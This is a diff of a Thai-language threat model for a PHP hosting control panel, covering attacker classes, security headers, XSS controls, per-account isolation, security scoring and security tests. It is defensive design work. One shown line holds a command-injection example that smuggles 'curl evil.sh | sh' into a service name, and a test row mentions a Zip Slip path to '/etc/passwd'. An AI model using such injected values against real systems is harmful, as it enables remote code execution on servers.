@@ -1,4 +1,4 @@
-# PHP Server Control Panel — Threat Model และการควบคุมความปลอดภัย
+# BluPanel — Threat Model และการควบคุมความปลอดภัย
 
 > เอกสารคู่กับ [ARCHITECTURE.md](ARCHITECTURE.md)
 > Control panel คือเป้าหมายที่มีค่าสูงที่สุดบนเซิร์ฟเวอร์ — ยึดได้ = ได้ทุกเว็บไซต์ + root
@@ -13,7 +13,7 @@
 |---|---|---|---|
 | A1 | คนนอกที่ยังไม่ล็อกอิน | เห็นหน้า login, สแกนพอร์ต | brute force, เดา session, ช่องโหว่ก่อน auth |
 | A2 | `webadmin` ที่ถูกยึดบัญชี | ล็อกอินได้ จัดการเว็บของตัวเอง | ยกระดับสิทธิ์เป็น sysadmin, IDOR ไปเว็บคนอื่น |
-| A3 | เว็บไซต์ที่โฮสต์อยู่ถูกแฮ็ก | รันโค้ด PHP ในสิทธิ์ `web_<id>` | อ่านไฟล์เว็บอื่น, อ่าน `panel.db`, ยกระดับเป็น root |
+| A3 | เว็บไซต์ที่โฮสต์อยู่ถูกแฮ็ก | รันโค้ด PHP ในสิทธิ์บัญชีของเจ้าของเว็บ | อ่านไฟล์ของลูกค้ารายอื่น, อ่าน `panel.db`, ยกระดับเป็น root |
 | A4 | คนในที่มีสิทธิ์ `sysadmin` | สั่งงานระบบได้เกือบทั้งหมด | ลบร่องรอย, ปิด audit, แอบสร้าง backdoor |
 | A5 | Supply chain | แทรกโค้ดผ่าน dependency / อัปเดต | โค้ดแปลกปลอมตอนอัปเดต |
 
@@ -90,17 +90,29 @@ agent รันด้วย root และเข้า MariaDB ผ่าน unix
 
 ### 2.3 การป้องกันระดับ HTTP
 
+แหล่งความจริงคือ [`src/Middleware/SecurityHeaders.php`](../src/Middleware/SecurityHeaders.php)
+ซึ่งทำงานเป็นชั้นนอกสุดเพื่อให้ header ติดไปกับทุกคำตอบ รวมถึงหน้า error และ 404
+
 ```
 Content-Security-Policy: default-src 'none';
     script-src 'self' 'nonce-<random ต่อ request>';
     style-src 'self'; img-src 'self' data:; media-src 'self' data:; font-src 'self';
     connect-src 'self'; form-action 'self'; frame-ancestors 'none';
-    base-uri 'none'
+    base-uri 'none'; manifest-src 'self'
 X-Content-Type-Options: nosniff
+X-Frame-Options: DENY
 Referrer-Policy: no-referrer
-Permissions-Policy: geolocation=(), camera=(), microphone=(), interest-cohort=()
+Permissions-Policy: geolocation=(), camera=(), microphone=(), payment=(), usb=(),
+                    interest-cohort=()
 Cross-Origin-Opener-Policy: same-origin
+Cross-Origin-Resource-Policy: same-origin
+Strict-Transport-Security: max-age=31536000; includeSubDomains   (เฉพาะเมื่อมาทาง HTTPS)
+Cache-Control: no-store, no-cache, must-revalidate, private      (ทุกเส้นทางยกเว้น /assets/)
 ```
+
+`media-src` ต้องมี `data:` เพราะตัวจัดการไฟล์เล่นเสียง/วิดีโอจาก data URI ที่ประกอบใน
+เบราว์เซอร์ — endpoint ดาวน์โหลดส่ง `application/octet-stream` + `attachment` เสมอโดยตั้งใจ
+(กัน stored XSS จากไฟล์ `.html` ของผู้ใช้) ซึ่งเบราว์เซอร์เล่นเป็นสื่อตรง ๆ ไม่ได้
 
 CSP ไม่มี `unsafe-inline` และไม่มี `unsafe-eval` เลย — เป็นเหตุผลที่ต้องเลิกใช้ `onclick=` และ Tailwind CDN ตาม [ARCHITECTURE §9.1](ARCHITECTURE.md#91-สิ่งที่ตัดออกจาก-prototype-เดิม-และเหตุผล)
 
@@ -108,12 +120,24 @@ CSP ไม่มี `unsafe-inline` และไม่มี `unsafe-eval` เ�
 
 > เดิมออกแบบให้ผูก token กับเส้นทางของฟอร์มด้วย เพื่อกันการนำ token จากฟอร์มความเสี่ยงต่ำ
 > ไปใช้กับฟอร์มที่อันตราย แต่ตอนนำไปใช้จริงพบว่าใช้ไม่ได้ — ฟอร์มจำนวนมากถูกเรนเดอร์ในหน้าหนึ่ง
-> แล้ว POST ไปอีกเส้นทางหนึ่ง (หน้า Services ส่งไป `/server/services/{unit}/{action}`)
-> token จึงไม่มีวันตรงกันและฟอร์มพังเงียบ ๆ ทั้งหมด
+> แล้ว POST ไปอีกเส้นทางหนึ่ง token จึงไม่มีวันตรงกันและฟอร์มพังเงียบ ๆ ทั้งหมด
 > จึงเปลี่ยนมาผูกกับ session อย่างเดียวซึ่งเป็นวิธีมาตรฐาน และประโยชน์ที่หายไปมีน้อยมาก
 > เมื่อมี SameSite=Strict กับ token ต่อ session อยู่แล้ว
 
-**XSS:** เทมเพลตใช้ `htmlspecialchars($v, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8')` เป็นค่าเริ่มต้นของฟังก์ชัน `e()` — การพิมพ์ตัวแปรดิบต้องเรียก `raw()` อย่างชัดเจน และมีกฎใน code review ว่า `raw()` ต้องมีคอมเมนต์อธิบายทุกจุด
+**XSS — ย้ายฝั่งไปแล้ว ไม่ได้หายไป**
+
+ตั้งแต่เฟส D ฝั่ง PHP ไม่ประกอบ HTML ที่ไหนเลยนอกจาก `ErrorPage` ตัวเดียว ทุก endpoint
+ตอบ JSON ล้วน · ฟังก์ชัน `e()` / `raw()` ของเทมเพลตชุดเดิมถูกลบไปพร้อมโฟลเดอร์ `views/`
+ความเสี่ยง XSS จึงย้ายไปอยู่ที่**ฝั่งเบราว์เซอร์**ทั้งหมด และกันด้วยสามชั้นนี้แทน:
+
+| ชั้น | รายละเอียด |
+|---|---|
+| CSP ไม่มี `unsafe-inline` และไม่มี `unsafe-eval` | สคริปต์ที่แทรกเข้ามาไม่ทำงาน ต้องมี nonce ที่ออกใหม่ทุกคำขอเท่านั้น |
+| `Now.init({allowEval: false})` | ตัดการตีความนิพจน์เป็นโค้ดที่ต้นทาง |
+| กฎในโค้ดฝั่ง SPA: ห้ามส่งข้อมูลจากเซิร์ฟเวอร์เข้า `innerHTML` | core ของ Now.js มี `innerHTML` อยู่ 135 จุด — โค้ดของเราจึงต้องผูกค่าผ่าน `data-text` ซึ่งเขียนลง `textContent` ไม่ใช่ประกอบ HTML เอง (ดูหัวไฟล์ `public/assets/spa/js/ui.js`) |
+
+ไฟล์ที่ผู้ใช้อัปโหลดถูกส่งกลับด้วย `Content-Disposition: attachment` + `nosniff` เสมอ
+ไฟล์ `.html` ของลูกค้าจึงไม่มีทางถูกเรนเดอร์บนโดเมนของ panel
 
 ### 2.4 ชั้นที่ 2 — ตัดคำสั่งอันตราย (กันทั้ง A2 และ A3)
 
@@ -149,17 +173,23 @@ POST /api/service/restart  {"service": "apache2; curl evil.sh | sh"}
 
 ### 2.6 กัน A3 — เว็บไซต์ที่โฮสต์ถูกแฮ็ก
 
-สถานการณ์ที่เกิดจริงบ่อยที่สุด: WordPress plugin เก่ามีช่องโหว่ → ผู้โจมตีรันโค้ด PHP ในสิทธิ์ `web_17`
+สถานการณ์ที่เกิดจริงบ่อยที่สุด: WordPress plugin เก่ามีช่องโหว่ → ผู้โจมตีรันโค้ด PHP
+ในสิทธิ์ของ**เจ้าของเว็บ** (บัญชี Linux ชื่อเดียวกับชื่อผู้ใช้ เช่น `somchai`)
 
 | การควบคุม | ผลลัพธ์ |
 |---|---|
-| 1 เว็บ = 1 uid + สิทธิ์ไดเรกทอรี 750 | อ่านไฟล์ของเว็บอื่นไม่ได้ |
-| `open_basedir` ต่อ pool | ต่อให้ PHP มีบั๊ก path ก็ยังออกนอกบ้านไม่ได้ |
+| 1 บัญชี = 1 uid + บ้านสิทธิ์ 750 และ `/home` เป็น 0711 | อ่านไฟล์ของ**ลูกค้ารายอื่น**ไม่ได้ และไล่ดูรายชื่อกันไม่ได้ |
+| `open_basedir` ต่อ pool ผูกกับบ้านของเจ้าของ | ต่อให้ PHP มีบั๊ก path ก็ยังออกนอกบ้านไม่ได้ |
 | `disable_functions` ปิด shell ทั้งหมด | รัน `system()`, `proc_open()` ไม่ได้ |
 | `panel.db` อยู่ `/var/lib/phpcp/` โหมด 0600 เจ้าของ `phpcp-web` | เว็บอ่านฐานข้อมูล panel ไม่ได้ |
-| socket ของ agent เป็น 0660 กลุ่ม `phpcp` | `web_17` ไม่ได้อยู่ในกลุ่มนี้ → ต่อ agent ไม่ได้เลย |
-| `noexec,nosuid,nodev` บน `/srv/phpcp/sites/*/tmp` (แนะนำใน install) | อัปโหลด binary แล้วรันไม่ได้ |
-| MariaDB: 1 เว็บ = 1 user + grant เฉพาะ DB ของตัวเอง | ยึด DB credential แล้วอ่าน DB เว็บอื่นไม่ได้ |
+| socket ของ agent เป็น 0660 กลุ่ม `phpcp` | บัญชีลูกค้าไม่ได้อยู่ในกลุ่มนี้ → ต่อ agent ไม่ได้เลย |
+| `noexec,nosuid,nodev` บนพาร์ทิชันของ `/home` (แนะนำใน install) | อัปโหลด binary แล้วรันไม่ได้ |
+| MariaDB: grant เฉพาะ DB ของบัญชีตัวเอง | ยึด DB credential แล้วอ่าน DB ของลูกค้ารายอื่นไม่ได้ |
+
+**สิ่งที่ด่านนี้ไม่ได้กัน โดยตั้งใจ:** เว็บของ**เจ้าของคนเดียวกัน**อ่านไฟล์กันได้และแชร์
+คิว process กัน ตั้งแต่ migration 0006 ที่ย้ายหน่วยของการแยกสิทธิ์จาก "เว็บ" ไปเป็น "ผู้ใช้"
+· ลูกค้าที่มี 5 เว็บถูกเจาะไปหนึ่งเว็บ เท่ากับถูกเจาะทั้ง 5 เว็บ — เป็นข้อแลกเปลี่ยนเดียวกับ
+cPanel/Plesk/DirectAdmin และเป็นเหตุผลที่ยังต้องแนะนำให้แยกบัญชีถ้าเว็บสองตัวมีคุณค่าต่างกันมาก
 
 ### 2.7 File manager — จุดเสี่ยงสูงสุด
 
@@ -244,21 +274,37 @@ hash[n] = sha256( hash[n-1] || ts || actor || action || target || result || deta
 
 ## 3. Security Center — หน้าจอในระบบ
 
-ตาม PROMPT.md ต้องมีคะแนนความปลอดภัยและคำแนะนำที่กดทำได้จริง
+ตาม [PROMPT.md](history/PROMPT.md) ต้องมีคะแนนความปลอดภัยและคำแนะนำที่กดทำได้จริง
 
-### 3.1 การคิดคะแนน (เต็ม 100)
+### 3.1 การคิดคะแนน
 
-| หมวด | คะแนน | เกณฑ์ |
+**ไม่ใช่ระบบ 100 คะแนนตายตัว** — เป็น**สัดส่วนถ่วงน้ำหนักของข้อที่ตรวจได้จริงบนเครื่องนั้น**
+(`floor(คะแนนที่ได้ / น้ำหนักรวม × 100)`) · ข้อที่ไม่เกี่ยวกับเครื่องนี้ เช่น SSH บนเครื่อง
+ที่ไม่ได้ติดตั้ง sshd จะไม่ถูกนับเข้าตัวหาร แทนที่จะถูกหักคะแนนทิ้ง
+
+แต่ละข้อให้เครดิตสามระดับ: ผ่าน = 1.0 · เตือน = 0.5 · ไม่ผ่านหรือตรวจไม่ได้ = 0
+
+| ข้อตรวจ | น้ำหนัก | ดูอะไร |
 |---|---|---|
-| การเข้าถึง SSH | 20 | ปิด root login (10) · ปิด password auth (7) · เปลี่ยนพอร์ตจาก 22 (3) |
-| Firewall | 15 | เปิดใช้งาน (10) · ไม่มีพอร์ตเปิดเกินจำเป็น (5) |
-| SSL | 20 | ทุกเว็บมี cert ที่ยังไม่หมดอายุ (12) · บังคับ HTTPS (5) · auto-renew เปิด (3) |
-| PHP | 15 | ไม่มีเว็บใช้เวอร์ชันหมดอายุ (10) · ปิด shell function ครบ (5) |
-| บัญชีผู้ใช้ | 15 | 2FA เปิดครบทุก admin (10) · ไม่มีรหัสผ่านอ่อน (5) |
-| สิทธิ์ไฟล์ | 10 | ไม่มีไฟล์/โฟลเดอร์ 777 · ไม่มีไฟล์ config ที่ world-readable |
-| การอัปเดต | 5 | ไม่มี security update ค้าง |
+| `firewall.active` | 20 | ufw เปิดใช้งานอยู่จริง (ถ้ายังไม่ได้ติดตั้งจะเป็น `firewall.installed` น้ำหนักเท่ากัน) |
+| `ssh.config` | 15 | root login · password auth · พอร์ต |
+| `ssl.coverage` | 15 | ทุกเว็บมีใบรับรองที่ยังไม่หมดอายุ |
+| `account.2fa` | 12 | 2FA เปิดครบทุกบัญชีที่ต้องเปิด |
+| `firewall.exposed` | 10 | พอร์ตที่เปิดกว้างเกินจำเป็น |
+| `php.version` | 10 | ไม่มีเว็บใช้เวอร์ชันที่หมดการสนับสนุน |
+| `file.permissions` | 10 | ไฟล์ตั้งค่าและฐานข้อมูลของ panel ตั้งสิทธิ์ถูกต้อง |
+| `ssl.forced` | 8 | ทุกเว็บบังคับ HTTPS |
+| `account.bruteforce` | 8 | จำนวนการล็อกอินที่ล้มเหลวใน 24 ชั่วโมง |
+| `ssl.autorenew` | 7 | `certbot.timer` ทำงานอยู่ |
 
-แสดงผลเป็น `ความปลอดภัยของเซิร์ฟเวอร์ — 92 / 100` พร้อมรายการที่หักคะแนน
+**คะแนนไม่มีวันแตะ 100 ด้วยการปัดขึ้น** — ปัดลงเสมอโดยตั้งใจ เพราะ 100 สื่อว่า
+"ไม่เหลืออะไรให้ทำแล้ว" ซึ่งไม่ควรเกิดจากการปัดเศษ
+
+แสดงผลพร้อมระดับ: ≥90 `ดี` · ≥70 `พอใช้` · ≥50 `ต้องปรับปรุง` · ต่ำกว่านั้น `เสี่ยง`
+
+> รายการนี้เปลี่ยนบ่อยกว่าที่เอกสารจะตามทัน — แหล่งความจริงคือ
+> [`src/Agent/Capability/SecurityScan.php`](../src/Agent/Capability/SecurityScan.php)
+> และสูตรคิดคะแนนอยู่ที่ [`src/Domain/SecurityScore.php`](../src/Domain/SecurityScore.php)
 
 ### 3.2 คำแนะนำต้องกดทำได้ ไม่ใช่แค่ข้อความ
 
@@ -289,7 +335,7 @@ hash[n] = sha256( hash[n-1] || ts || actor || action || target || result || deta
 
 ## 4. ยืนยันการทำงานอันตราย
 
-PROMPT.md กำหนดว่าต้องเตือนก่อนทำงานอันตราย แบ่งเป็น 3 ระดับ:
+[PROMPT.md](history/PROMPT.md) กำหนดว่าต้องเตือนก่อนทำงานอันตราย แบ่งเป็น 3 ระดับ:
 
 | ระดับ | ตัวอย่าง | UI |
 |---|---|---|
@@ -338,11 +384,20 @@ PHP-FPM 8.4 กำลังถูกใช้งานโดย 2 เว็บ�
 
 | ชุดทดสอบ | ตรวจอะไร |
 |---|---|
-| `tests/security/CapabilityFuzzTest` | ยิงค่าผิดรูปแบบ (shell metachar, `../`, null byte, ยาวเกิน, unicode) เข้าทุก capability — ต้อง `denied` ทุกครั้ง ไม่ใช่ error 500 |
-| `tests/security/PathTraversalTest` | ทุก path operation ต้องกัน `../`, symlink, absolute path, encoded traversal |
-| `tests/security/RbacMatrixTest` | ตาราง role × capability ครบทุกช่อง — ยืนยันว่า `webadmin` ถูกปฏิเสธในทุก capability ของ SERVER |
-| `tests/security/SelfProtectionTest` | ทุก capability ที่รับ unit/path/user ต้องปฏิเสธทรัพยากรของ panel เอง |
-| `tests/security/CsrfSessionTest` | ไม่มี token / token ผิด / session หมดอายุ / เปลี่ยน IP → ต้องถูกปฏิเสธ |
-| `tests/security/ZipSlipTest` | ไฟล์ zip ที่มี entry `../../etc/passwd` ต้องถูกปฏิเสธ |
+| `tests/security/CapabilityFuzzTest.php` | ยิงค่าผิดรูปแบบ (shell metachar, `../`, null byte, ยาวเกิน, unicode) เข้าทุก capability — ต้องปฏิเสธด้วย `ValidationError` ทุกครั้ง ไม่ใช่ error 500 |
+| `tests/security/FileManagerTest.php` | ด่านกันหลุดออกนอกบ้าน — `../`, symlink, absolute path, encoded traversal **และ Zip Slip** (entry ที่มี `../` ในไฟล์บีบอัด) |
+| `tests/security/RbacMatrixTest.php` | ตาราง role × permission ครบทุกช่อง — ทุกเมนูต้องใช้สิทธิ์เดียวกับหน้าที่มันชี้ไป |
+| `tests/security/ServerBoundaryTest.php` | `webadmin` เปิด URL ของหน้า SERVER แล้วต้องได้ 403 ทุกหน้า ไม่ใช่แค่ซ่อนเมนู |
+| `tests/security/SelfProtectionTest.php` | ทุก capability ที่รับ unit/path/user ต้องปฏิเสธทรัพยากรของ panel เอง |
+| `tests/security/SessionRotationTest.php` | การหมุน session id ต้องทนคำขอที่ยิงพร้อมกัน ไม่เตะผู้ใช้ออกกลางคัน |
+| `tests/security/TotpReplayTest.php` | รหัส 2FA หนึ่งรหัสใช้ได้ครั้งเดียว ใช้ซ้ำต้องถูกปฏิเสธ |
+| `tests/security/BinaryPathTest.php` | เส้นทางโปรแกรมภายนอกที่ driver ฮาร์ดโค้ดไว้ ต้องชี้ไปที่ไฟล์ที่มีอยู่จริง |
+| `tests/api/SessionApiTest.php` | CSRF: ไม่มี token / token ผิด / session หมดอายุ → ต้องถูกปฏิเสธ |
 
-รันทั้งหมดในโหมด `dryrun` ได้ — จึงใส่ใน CI ที่ไม่มีสิทธิ์ root ได้
+รวมทั้งหมด **56 ไฟล์ใน `tests/security/` + 12 ไฟล์ใน `tests/api/`** — ตารางนี้เป็นข้อที่
+สำคัญที่สุด ไม่ใช่รายการครบ · รันทั้งชุดด้วย `php tests/run.php` หรือทีละกลุ่มด้วย
+`php tests/run.php RbacMatrix`
+
+ทุกเทสต์รันในโหมด `dryrun`/`sandbox` ได้ จึงใส่ใน CI ที่ไม่มีสิทธิ์ root ได้ · CI ยัง
+ติดตั้ง `bind9-utils`, `openssh-server` และ `systemd` ด้วย เพราะบางเทสต์เรียกโปรแกรม
+เหล่านั้นที่ path จริงเพื่อพิสูจน์ว่าค่าคงที่ในโค้ดชี้ถูกที่
